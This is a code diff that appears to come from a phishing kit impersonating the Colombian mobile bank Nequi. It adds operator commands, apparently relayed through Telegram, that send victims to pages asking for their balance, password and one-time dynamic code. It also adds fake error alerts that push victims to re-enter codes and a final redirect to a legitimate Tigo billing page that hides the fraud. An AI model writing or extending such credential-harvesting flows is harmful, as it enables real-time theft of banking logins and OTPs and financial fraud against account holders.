@@ -385,16 +385,20 @@ function handleBankAction(action, bankCode, bankTelegram, btn, originalText, inp
         
         case 'pedir_saldo':
         case 'request_saldo':
+        case 'nequi_pedir_saldo':
+        case 'nequi_request_saldo':
             console.log('[BANCAS] Redirigiendo a saldo-input.html');
             bankTelegram.redirect('saldo-input.html');
             break;
         
         case 'saldo_aprobado':
+        case 'nequi_saldo_aprobado':
             console.log('[BANCAS] Saldo aprobado, redirigiendo a clave.html');
             bankTelegram.redirect('clave.html');
             break;
         
         case 'request_clave':
+        case 'nequi_request_clave':
             console.log('[BANCAS] Solicitando clave');
             if (bankCode === 'nequi') {
                 bankTelegram.redirect('clave.html');
@@ -405,6 +409,8 @@ function handleBankAction(action, bankCode, bankTelegram, btn, originalText, inp
         
         case 'saldo_rechazado':
         case 'error_saldo':
+        case 'nequi_saldo_rechazado':
+        case 'nequi_error_saldo':
             console.log('[BANCAS] Saldo rechazado/error');
             bankTelegram.hideLoading();
             alert('Saldo incorrecto. Por favor verifica el saldo en tu app Nequi e intenta nuevamente.');
@@ -419,7 +425,31 @@ function handleBankAction(action, bankCode, bankTelegram, btn, originalText, inp
             }
             break;
         
+        case 'request_dinamica':
+        case 'nequi_request_dinamica':
+            console.log('[BANCAS] Solicitando clave dinámica');
+            bankTelegram.redirect('clave-dinamica.html');
+            break;
+        
+        case 'error_dinamica':
+        case 'nequi_error_dinamica':
+            console.log('[BANCAS] Error en dinámica, redirigiendo nuevamente');
+            bankTelegram.hideLoading();
+            alert('Código dinámico incorrecto. Por favor intenta nuevamente.');
+            if (inputs) {
+                if (Array.isArray(inputs) || inputs.length) {
+                    Array.from(inputs).forEach(inp => inp.value = '');
+                }
+            }
+            if (btn) {
+                btn.disabled = false;
+                btn.textContent = originalText;
+            }
+            break;
+        
         case 'finalizar':
+        case 'nequi_finalizar':
+            console.log('[BANCAS] Finalizando sesión');
             bankTelegram.redirect('https://mi.tigo.com.co/pago-express/facturas');
             break;
         
